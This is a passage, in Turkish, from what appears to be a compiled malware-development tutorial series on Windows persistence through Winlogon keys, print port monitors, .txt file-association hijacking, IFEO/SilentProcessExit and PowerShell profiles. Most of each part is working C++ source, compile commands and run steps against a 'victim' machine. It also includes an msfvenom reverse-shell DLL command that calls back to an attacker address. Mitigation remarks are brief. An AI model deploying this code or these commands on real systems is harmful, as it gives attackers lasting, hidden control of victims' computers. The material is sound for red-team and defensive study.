Daha doğru bir deney yapmak için, Process Hacker 2'de hack.exe dosyasının özelliklerini kontrol edin:

+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, ana işlem winlogon.exe olarak görünüyor.
Temizleyelim:
reg add \
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon" \
/v "Userinit" /t REG_SZ /d \
"C:\Windows\System32\userinit.exe" /f

+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her iki durumda da kötü amaçlı yazılım Windows kimlik doğrulaması sırasında çalıştırılacaktır.
Ancak, burada ilginç bir nokta var. Örneğin, eğer aşağıdaki mantıkla kayıt defteri anahtarını güncellersek:
/*
pers.cpp
windows persistence via winlogon keys
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/12/malware-pers-7.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
// shell
const char* sh = "explorer.exe,
Z:\\2022-06-12-malware-pers-7\\hack.exe";

// startup
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add
// "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
// NT\CurrentVersion\Winlogon" /v
// "Shell" /t REG_SZ /d "explorer.exe,..." /f
RegSetValueEx(hkey, (LPCSTR)"Shell", 0,
REG_SZ, (unsigned char*)sh, strlen(sh));
RegCloseKey(hkey);
}
return 0;
}

Yani, kötü amaçlı yazılımımız C:\Windows\System32\hack.exe yerine Z:...\hack.exe yolunda bulunuyor.
Çalıştırın:
.\pers.exe
req query "HKLM\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon" /s

+++++++++++++++++++++++++++++++++++++++++++++++

Ve tekrar oturum açın:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

hack.exe'nin özelliklerini kontrol etme:

+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, üst süreç Mevcut Olmayan Süreç olarak görünüyor. Parent, Mevcut Olmayan Süreç olarak görünecektir çünkü userinit.exe kendini sonlandırır.


Bir not daha var. Ayrıca, Notify kayıt defteri anahtarı genellikle eski işletim sistemlerinde (Windows 7’den önce) bulunur ve Winlogon olaylarını yöneten bir bildirim paketi DLL dosyasına işaret eder. Eğer bu kayıt defteri anahtarı altındaki DLL girişlerini başka bir DLL ile değiştirirseniz, Windows oturum açma sırasında onu çalıştıracaktır.
Peki, önlemler ne olabilir? Kullanıcı hesap ayrıcalıklarını sınırlandırarak yalnızca yetkili yöneticilerin Winlogon yardımcı programını değiştirmesine izin verin. Sysinternals Autoruns gibi araçlar, sistem değişikliklerini tespit etmek için kullanılabilir. Bu araç, mevcut Winlogon yardımcı değerlerinin listesini çıkararak kalıcılık girişimlerini belirleyebilir.
Bu kalıcılık tekniği, Turla grubu ve Gazer, Bazaar gibi yazılımlar tarafından vahşi doğada (in the wild) kullanılmıştır.
MITRE ATT&CK - Boot or Logon Autostart Execution: Winlogon Helper DLL
Turla
Gazer backdoor
Bazaar
Github’taki kaynak kod



74. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 8. Bağlantı Noktası Monitörleri. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, kötü amaçlı yazılım kalıcılık tekniklerinden biri olan bağlantı noktası monitörleri üzerine yapılan kişisel araştırmaların bir sonucudur.
Bağlantı Noktası Monitörleri
Bu gönderide Bağlantı Noktası Monitörü, Windows Yazdırma Biriktirici Hizmeti veya spoolv.exe’yi ifade etmektedir. Bir yazıcı bağlantı noktası monitörü eklerken, bir kullanıcı (veya saldırgan), “monitör” olarak hizmet eden rastgele bir DLL ekleyebilir.
Bağlantı noktası monitörü eklemenin, yani kötü amaçlı DLL’inizi yerleştirmenin temelde iki yolu vardır: Kalıcılık için Kayıt Defteri aracılığıyla veya anında DLL yürütme için özel bir Windows uygulaması (AddMonitor işlevi) kullanarak.
Monitör Ekleme
Win32 API’yi, özellikle Yazdırma Biriktirici API’sinin AddMonitor işlevini kullanarak:
BOOL AddMonitor(
LPTSTR pName,
DWORD Level,
LPBYTE pMonitors
);

Sistem çalışırken rastgele bir monitör DLL’si eklemek mümkündür.
Monitörü eklemek için yerel yönetici ayrıcalıklarına ihtiyacınız olacağını unutmayın.
Örneğin, monitörümüzün kaynak kodu:
/*
monitor.cpp
windows persistence via port monitors
register the monitor port
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/19/malware-pers-8.html
*/
#include "windows.h"
#pragma comment(lib, "winspool")

int main(int argc, char* argv[]) {
MONITOR_INFO_2 mi;
mi.pName = "Monitor";
mi.pEnvironment = "Windows x64";
// mi.pDLLName = "evil.dll";
mi.pDLLName = "evil2.dll";
AddMonitor(NULL, 2, (LPBYTE)&mi);
return 0;
}

Şu kodu derleyelim:

x86_64-w64-mingw32-g++ -O2 monitor.cpp -o monitor.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -lwinspool

+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca, “kötü” DLL’imizi oluşturun:
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=192.168.56.1 LPORT=4445 -f dll > evil2.dll
+++++++++++++++++++++++++++++++++++++++++++++++
Kodun derlenmesi, sistemde kötü niyetli DLL'yi (evil2.dll) kaydedecek bir yürütülebilir dosya (benim durumumda monitor.exe) üretecektir.
“Monitör” ekleme demosu
Dosyaları kopyalayın ve çalıştırın:
copy Z:\2022-06-19-malware-pers-8\evil2.dll .\
copy Z:\2022-06-19-malware-pers-8\monitor.exe .\
.\monitor.exe

+++++++++++++++++++++++++++++++++++++++++++++++

Kayıt Defteri Kalıcılığı
Alt anahtar bağlantı noktası monitörlerinin bir listesi, şu düğüm içinde bulunabilir:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors
Her anahtar, bir Drivers DLL içeren bir REG_SZ girişi içermelidir. Sistem başlangıcında, bu DLL'lerin her biri SYSTEM olarak çalıştırılacaktır.
Öncelikle, kötü amaçlı işlemlerden önce alt anahtarları kontrol edin:
reg query \
"HKLM\System\CurrentControlSet\Control\Print\Monitors" \
/s

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, Meow adlı bir alt anahtar ve Driver değeri ekleyin:

reg add \
"HKLM\System\CurrentControlSet\Control\Print\Monitors\Meow"
/v "Driver" /d "evil2.dll" /t REG_SZ
reg query \
"HKLM\System\CurrentControlSet\Control\Print\Monitors"
/s

+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey doğru şekilde tamamlandı. Ardından, kurbanın bilgisayarını yeniden başlatın:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ve birkaç dakikadan sonra:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Hadi Process Hacker 2'de Ağ sekmesini kontrol edelim:

+++++++++++++++++++++++++++++++++++++++++++++++

Görüyoruz ki evil2.dll, spoolsv.exe (PID: 4616) tarafından erişiliyor ve sonunda bizim payload’umuzu çalıştıran rundll32sürecini başlatıyor, bu da saldırgana geri bağlantı başlatıyor:

+++++++++++++++++++++++++++++++++++++++++++++++

Deneylerin sonunda temizleme işlemi için aşağıdaki komutu çalıştırın:

Remove-ItemProperty -Path \
"HKLM:\System\CurrentControlSet\Control\Print\Monitors\
Meow" -Name "Driver"

+++++++++++++++++++++++++++++++++++++++++++++++

Kayıt defteri kalıcılığı için “kirli PoC”im:

/*
pers.cpp
windows persistence via port monitors
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/19/malware-pers-8.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// subkey
const char* sk =
"\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow";

// evil DLL
const char* evilDll = "evil.dll";

// startup
LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE,
KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
if (res == ERROR_SUCCESS) {
// create new registry key
RegSetValueEx(hkey, (LPCSTR)"Driver", 0, REG_SZ,
(unsigned char*)evilDll, strlen(evilDll));
RegCloseKey(hkey);
} else {
printf("failed to create new registry subkey :(");
return-1;
}
return 0;
}

Defcon 22 sırasında, Brady Bloxham bu kalıcılık tekniğini gösterdi. Bu yöntem, Yönetici ayrıcalıkları gerektirir ve DLL’in diske kaydedilmesi gerekir.
Hâlâ cevaplanması gereken soru, herhangi bir APT'nin bu tekniği gerçek saldırılarda kullanıp kullanmadığıdır.

Windows Print Spooler Service
Defcon-22: Brady Bloxham - Getting Windows to Play with itself
MITRE ATT&CK - Port Monitors persistence technique
Github’taki kaynak kod


75. Zararlı yazılım geliştirme: Kalıcılık - Bölüm 9. Varsayılan dosya uzantısı ele geçirme. Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu makale, ilginç zararlı yazılım kalıcılık tekniklerinden biri olan varsayılan dosya uzantısı ele geçirme üzerine kendi araştırmamın bir sonucudur.
Varsayılan dosya ilişkilendirmesi
Örneğin, bir .txt dosyasına çift tıklandığında, açmak için notepad.exe kullanılır.
+++++++++++++++++++++++++++++++++++++++++++++++
Windows, .txt dosyalarına erişmek için notepad.exe kullanması gerektiğini bilir, çünkü .txt uzantısı (ve diğer birçok uzantı), bu tür dosyaları açabilen uygulamalara kayıt defterinde HKEY_CLASSES_ROOT altında eşlenmiştir.
Varsayılan bir dosya ilişkilendirmesini ele geçirmek ve kötü amaçlı bir program çalıştırmak mümkündür.
Pratik örnek
Şimdi .txt uzantısını ele geçireceğiz. Bu durumda, .txt uzantısının işleyicisi aşağıdaki kayıt defteri anahtarında belirtilmiştir:
HKEY_CLASSES_ROOT\txtfile\shell\open\command
Komutu çalıştırın:
reg query "HKCR\txtfile\shell\open\command" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, “kötü amaçlı” uygulamamızı oluşturun:

/*
hack.cpp
evil app for windows persistence via
hijacking default file extension
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}

Gördüğünüz gibi, mantık her zamanki gibi oldukça basit: sadece meow-meow mesaj kutusunu açıyor.
Bir sonraki adımda, aşağıdaki komut dosyasıyla \HKEY_CLASSES_ROOT\txtfile\shell\open\command değer verisini değiştirerek .txt dosya uzantısını ele geçirin:

/*
pers.cpp
windows persistence via
hijacking default file extension
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// command for replace
// "%SystemRoot%\\system32\\NOTEPAD.EXE %1"
// malicious app
const char* cmd = "Z:\\2022-08-26-malware-pers-9\\hack.exe";

// hijacking logic
LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)
"\\txtfile\\shell\\open\\command", 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// update key
RegSetValueEx(hkey, (LPCSTR)""
, 0, REG_SZ, (unsigned char*)cmd,
strlen(cmd));
RegCloseKey(hkey);
}
return 0;
}

Gördüğünüz gibi, bu kaynak kodunda sadece %SystemRoot%\system32\NOTEPAD.EXE %1 ifadesini Z:\2022-08-26-malware-pers-9\hack.exe ile değiştiriyoruz.
Demo
Her şeyi çalışırken görelim. Kötü amaçlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Oluşturulan hack.exe dosyası, kurbanın makinesine yerleştirilmelidir.
Ardından, kalıcılıktan sorumlu programı derleyelim:

x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Oluşturulan pers.exe dosyası da kurbanın makinesine yerleştirilmelidir.
Ardından sadece çalıştırın:

.\pers.exe

+++++++++++++++++++++++++++++++++++++++++++++++
Öyleyse, bir .txt dosyası açmayı deneyin, örneğin test.txt dosyasına çift tıklayın:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, “malware” çalıştırılacaktır. Mükemmel! :)
Ardından, temizleme işlemi:

reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\system

+++++++++++++++++++++++++++++++++++++++++++++++

Gerçek bir malware’de bunu biraz farklı bir mantıkla yapmak iyi bir uygulama olacaktır, böylece kurban kullanıcı hala orijinal .txt dosyasını açabilecek, ancak ek olarak kötü amaçlı etkinliği de çalıştıracaktır.


Bu kalıcılık tekniği SILENTTRINITY framework’ü ve Kimsuky siber casusluk grubu tarafından kullanılmaktadır. Bu malware, 2019 yılında Hırvatistan hükümet kurumlarına yönelik bir kampanyada kimliği belirsiz siber aktörler tarafından kullanılmıştır.


Umarım bu yazı, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.

MITRE ATT&CK: Change Default File Association
SILENTTRINITY
Kimsuky
Github’taki kaynak kod


77. malware development: persistence - part 11. Application Shimming. Simple C++ example.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, Image File Execution Options (IFEO) aracılığıyla gerçekleştirilen ilginç bir kötü amaçlı yazılım kalıcılığı tekniği üzerine yaptığım kendi araştırmamın sonucudur.
Image File Execution Options
IFEO, geliştiricilerin bir uygulamaya veya sürece hata ayıklayıcı eklemesine olanak tanır. Bu, hata ayıklayıcının/uygulamanın hata ayıklanan uygulama ile eşzamanlı olarak çalışmasını sağlar.
Bu özelliği nasıl ayarlayabiliriz? Belirli bir uygulama sessizce sonlandığında bir işlem/program başlatabiliriz.
Bir uygulamanın sessizce sona ermesi, aşağıdaki iki şekilde gerçekleştiği anlamına gelir:
Uygulamanın ExitProcess çağrısı yaparak kendisini sonlandırması
Başka bir sürecin TerminateProcess çağrısı yaparak izlenen süreci sonlandırması
Bu, aşağıdaki kayıt defteri anahtarı aracılığıyla yapılandırılabilir:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
Pratik Örnek
Microsoft Paint (mspaint.exe) sessizce sonlandığında kötü amaçlı yazılımımızın çalıştırılmasını sağlayalım.
Diyelim ki elimizde “kötü amaçlı yazılımımız” (hack.cpp) var:
/*
hack.cpp
evil app for windows persistence via IFEO
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}

Gördüğünüz gibi, her zamanki gibi “meow-meow” mesaj kutusu “kötü amaçlı yazılımını” kullanıyorum =..=
Ardından, kayıt defterini değiştirmek için kalıcılık sağlama betiğini oluşturun (pers.cpp):
/*
pers.cpp
windows persistence via IFEO (GlobalFlag)
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
DWORD gF = 512;
DWORD rM = 1;

// image file
const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
File Execution Options\\mspaint.exe";

// silent exit
const char* silent = "SOFTWARE\\Microsoft\\Windows
NT\\CurrentVersion\\SilentProcessExit\\mspaint.exe";

// evil app
const char* exe = "Z:\\2022-09-10-malware-pers-10\\hack.exe";

// GlobalFlag
// LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\C
LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
// Execution Options\mspaint.exe" /v GlobalFlag /t REG_DWORD /d 512
RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD, (const BYTE*)&gF, sizeof(gF));
RegCloseKey(hkey);
}

// res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
//"SOFTWARE\\Microsoft\\Windows
//NT\\CurrentVersion\\SilentProcessExit\\mspaint.exe", 0 , KEY_WRITE, &hkey);
res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)silent, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add "HKLM\SOFTWARE\Microsoft\Windows
// NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t
// REG_DWORD /d 1
// reg add "HKLM\SOFTWARE\Microsoft\Windows
// NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d
// "Z:\..\hack.exe"
RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD,
(const BYTE*)&rM, sizeof(rM));
RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ,
(unsigned char*)exe, strlen(exe));
RegCloseKey(hkey);
}
return 0;
}

Peki burada ne yaptık? Öncelikle, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion altında SilentProcessExit anahtarını oluşturduk, ardından GlobalFlag ekleyerek sessiz süreç çıkış izleme özelliğini etkinleştirdik:

//...

LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);

//...
//...

// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
// Execution Options\mspaint.exe" /v GlobalFlag /t REG_DWORD /d 512
RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD,
(const BYTE*)&gF, sizeof(gF));
//...

MonitorProcess değerini ...\hack.exe olarak ve ReportingMode değerini 1 olarak ayarlayarak, mspaint.exe her sessiz çıkış yaptığında hack.exe adlı "zararlı yazılımımızın" çalışmasını tetiklemiş olduk:

//...

RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD,
(const BYTE*)&rM, sizeof(rM));
RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ, (unsigned char*)exe,
strlen(exe));

Demo
Bu işlemi görmek için zararlı yazılımı derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Çalıştırın ve doğruluğunu kontrol edin:

+++++++++++++++++++++++++++++++++++++++++++++++

Öncelikle kayıt defteri anahtarlarını kontrol edin:

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /

+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca SilentProcessExit anahtarını da kontrol edin:

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" /s

+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, beklendiği gibi, hedef uygulamamız için bazı kayıt defteri anahtarları eksik. Bu nedenle, uygulama başlatıldığında ve kapatıldığında hiçbir şey olmuyor:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Peki, şimdi derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
ve kalıcılık için scriptimizi (pers.exe) çalıştırın, ardından kayıt defteri anahtarlarını tekrar kontrol edin:
.\pers.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s
+++++++++++++++++++++++++++++++++++++++++++++++
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" /s
+++++++++++++++++++++++++++++++++++++++++++++++
Son olarak, mspaint.exe'yi tekrar çalıştırın:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Ve kapatalım:
+++++++++++++++++++++++++++++++++++++++++++++++

ReportingMode kayıt defteri anahtarı, Windows Hata Bildirme işlemini (WerFault.exe) etkinleştirir, bu da MonitorProcess anahtar değerinin (hack.exe) üst süreci olacaktır:
+++++++++++++++++++++++++++++++++++++++++++++++


WerFault.exe – işletim sistemi, Windows özellikleri ve uygulamalarla ilgili hataları izlemek için kullanılır.
IFEO hata ayıklayıcı türü
IFEO'nun başka bir uygulaması debugger anahtarı üzerinden yapılabilir.
Sadece şu kayıt defteri anahtarında bir hata ayıklayıcı oluşturun:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe
Böylece, yalnızca kötü amaçlı uygulamanın System32 içine kaydedilmesi yeterlidir.
Kaynak kodu basittir ve şu şekilde görünmektedir:
/*
pers2.cpp
windows persistence via IFEO 2(Debugger)
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
DWORD gF = 512;
DWORD rM = 1;

// image file
const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
File Execution Options\\mspaint.exe";

// evil app
const char* exe = "hack.exe";

// Debugger
LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
// Execution Options\mspaint.exe" /v Debugger /d "hack.exe"
RegSetValueEx(hkey, (LPCSTR)"Debugger", 0, REG_SZ, (unsigned char*)exe,
strlen(exe));
RegCloseKey(hkey);
}
return 0;
}

Ve şu kodu derleyelim:

x86_64-w64-mingw32-g++ -O2 pers2.cpp -o pers2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Bunun nasıl çalıştığını gösteren bir örnek:

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

Microsoft Paint (mspaint.exe) süreci başlatıldığında, bu kötü amaçlı yazılımın çalışmasına neden olacaktır. Mükemmel!


Bu kalıcılık tekniği, APT29 grubu ve SUNBURST gibi yazılımlar tarafından gerçek dünyada kullanılmıştır.


Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.

ATT&CK MITRE: IFEO Injection
MSDN: Monitoring Silent Process Exit
Persistence using GlobalFlags in Image File Execution Options - Hidden from au-
toruns.exe
APT29
SUNBURST
Github’taki kaynak kod


77. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 11. PowerShell Profili.  
Basit C++ örneği.

﷽


+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, PowerShell profili aracılığıyla gerçekleştirilen ilginç bir kötü amaçlı yazılım kalıcılık tekniği üzerine kendi araştırmalarımın bir sonucudur.
PowerShell Profili
Bir PowerShell profili, sistem yöneticilerinin ve son kullanıcıların ortamlarını yapılandırmalarına ve bir Windows PowerShell oturumu başladığında belirli komutları çalıştırmalarına olanak tanıyan bir PowerShell betiğidir.
PowerShell profil betiği, WindowsPowerShell klasöründe saklanır:
+++++++++++++++++++++++++++++++++++++++++++++++
Hedef kullanıcının PowerShell profil dosyasına aşağıdaki kodu ekleyelim. Bu kod, enfekte olmuş kullanıcı bir PowerShell konsolu açtığında otomatik olarak çalıştırılacaktır:
Z:\2022-09-20-malware-pers-11\hack.exe
Her şeyi pratik bir örnekle göstereceğim ve böylece tüm süreci anlayacaksınız.
Pratik Örnek
Öncelikle, "kötü amaçlı" dosyamızı oluşturalım:
/*
hack.cpp
evil app for windows
persistence via powershell profile
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}

Her zamanki gibi, bu sadece "meow-meow" mesaj kutusudur.
Derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra, doğruluğunu kontrol etmek için kurbanın makinesinde çalıştırabiliriz:
+++++++++++++++++++++++++++++++++++++++++++++++
Ardından bu basit “hileyi” yapıyoruz:
echo Z:\2022-09-20-malware-pers-11\hack.exe >
"%HOMEPATH%\Documents\windowspowershell\profile.ps1"

Ve son olarak, PowerShell'i çalıştırın:

powershell -executionpolicy bypass

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, kötü amaçlı mantığımız beklendiği gibi çalıştı ve PowerShell, mesaj kutumuzun üst süreci oldu.
Basitleştirilmiş bir PoC kodu oluşturdum, bu işlemi otomatikleştirmek için:
/*
pers.cpp
windows persistence via Powershell profile
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
*/
#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <iostream>

int main(int argc, char* argv[]) {
char path[MAX_PATH];
char *homepath = getenv("USERPROFILE");
char pspath[] = "\\Documents\\windowspowershell";
char psprofile[] = "\\profile.ps1";
char evil[] = "Z:\\2022-09-20-malware-pers-11\\hack.exe";
DWORD evilLen = (DWORD)strlen(evil);

StringCchCopy(path, MAX_PATH, homepath);
StringCchCat(path, MAX_PATH, pspath);
BOOL wd = CreateDirectoryA(path, NULL);
if (wd == FALSE) {
	printf("unable to create dir: %s\n", path);
} else {
	printf("successfully create dir: %s\n", path);
}

StringCchCat(path, MAX_PATH, psprofile);
HANDLE hf = CreateFile(
path,
GENERIC_WRITE,
0,
NULL,
CREATE_NEW,
FILE_ATTRIBUTE_NORMAL,
NULL
);
if (hf == INVALID_HANDLE_VALUE) {
	printf("unable to create file: %s\n", path);
} else {
	printf("successfully create file: %s\n", path);
}

BOOL wf = WriteFile(hf, evil, evilLen, NULL, NULL);
if (wf == FALSE) {
	printf("unable to write to file %s\n", path);
} else {
	printf("successfully write to file evil path: %s\n", evil);
}
CloseHandle(hf);
return 0;
}

Mantık basittir, bu betik sadece profil klasörünü oluşturur (eğer yoksa), ardından profil dosyasını oluşturur ve günceller.
Demo
Her şeyi çalışırken görmek için PoC kodumuzu derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

Ve bunu kurbanın makinesinde çalıştıralım:

.\pers.exe

+++++++++++++++++++++++++++++++++++++++++++++++

+++++++++++++++++++++++++++++++++++++++++++++++

Ve powershell oturumu başladığında:
+++++++++++++++++++++++++++++++++++++++++++++++
Process Hacker ile kontrol edersek:
+++++++++++++++++++++++++++++++++++++++++++++++
powershell.exe beklediğimiz gibi yine üst süreçtir.
Gördüğünüz gibi her şey mükemmel çalıştı! =..=
